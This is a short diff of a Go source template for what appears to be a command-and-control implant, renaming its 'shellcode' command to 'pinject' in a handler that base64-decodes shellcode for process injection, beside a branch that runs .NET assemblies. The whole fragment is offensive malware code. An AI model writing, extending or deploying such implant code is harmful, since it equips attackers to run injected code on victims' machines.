@@ -22,9 +22,9 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
     } else if strings.HasPrefix(command, "assembly ") {
         result := a.{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command)
         return result
-    } else if strings.HasPrefix(command, "shellcode ") {
+    } else if strings.HasPrefix(command, "pinject ") {
         // Handle shellcode injection command
-        encodedShellcode := command[10:] // Remove "shellcode " prefix
+        encodedShellcode := command[8:] // Remove "pinject " prefix
         shellcodeData, err := base64.StdEncoding.DecodeString(encodedShellcode)
         if err != nil {
             return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
